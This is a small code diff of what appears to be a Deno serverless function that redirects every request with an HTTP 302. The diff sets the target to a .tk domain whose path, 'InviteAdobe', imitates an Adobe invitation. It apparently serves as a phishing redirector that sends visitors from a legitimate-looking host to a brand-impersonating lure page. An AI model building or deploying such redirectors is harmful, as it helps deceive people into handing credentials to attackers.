@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://lVDR0xuc3ZNVn/", // Replace this with your actual link
+      Location: "https://ib.anonymismus.tk/inv/InviteAdobe/", // Replace this with your actual link
     },
   });
 });
